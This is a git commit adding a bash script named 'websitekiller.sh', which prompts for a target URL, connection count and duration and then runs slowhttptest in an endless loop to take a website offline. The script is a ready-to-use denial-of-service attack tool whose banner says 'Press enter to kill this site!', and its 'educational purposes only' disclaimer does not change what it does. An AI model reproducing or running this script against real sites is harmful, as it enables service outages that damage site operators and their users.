0421c0552665d0d662158af058c1489872703cd7
3v3ryw3r3 <40157373+3v3ryw3r3@users.noreply.github.com>
2018-06-10 23:39:52 -0400

    Add files via upload

---
+++ websitekiller.sh
@@ -0,0 +1,72 @@
+clear
+
+echo "__        __   _         _ _         _  ___ _ _"          
+echo "\ \      / /__| |__  ___(_) |_ ___  | |/ (_) | | ___ _ __" 
+echo " \ \ /\ / / _ \ '_ \/ __| | __/ _ \ | ' /| | | |/ _ \ '__|"
+echo "  \ V  V /  __/ |_) \__ \ | ||  __/ | . \| | | |  __/ |   "
+echo "  \_/\_/ \___|_.__/|___/_|\__\___| |_|\_\_|_|_|\___|_|   "
+echo
+echo "This is for educational purposes only! I am not responsable for your actions!!"
+echo "Created By: 3V3RYW3R3"
+
+echo 
+
+sleep 2
+
+echo Enter the FULL Url of the host:
+
+read url
+
+clear
+
+echo Url = $url
+
+sleep 1
+
+clear
+
+echo Url = $url
+echo
+echo Set the number of connections to be made, Default is 3000:
+
+read con
+
+clear
+
+echo Url = $url
+echo Connections = $con
+echo
+sleep 1
+
+echo Enter the length of the attack in seconds:
+
+read time
+
+clear
+
+echo Url = $url
+echo Connections = $con
+echo Time = $time
+echo
+sleep 1
+
+echo The attack will now begin in a loop, if the site goes offline and then back online, press CONTROL C. If you get crazy lines of error codes, ya did somthing wrong in the setup
+
+sleep 3
+echo
+echo Press enter to kill this site!
+
+read start
+
+clear
+
+echo See ya later aligator!
+
+sleep 1
+
+clear
+
+while :
+do
+slowhttptest -c $con -H -l $time -i 10 -r 200 -t GET -u $url -x 24 -p 3
+done
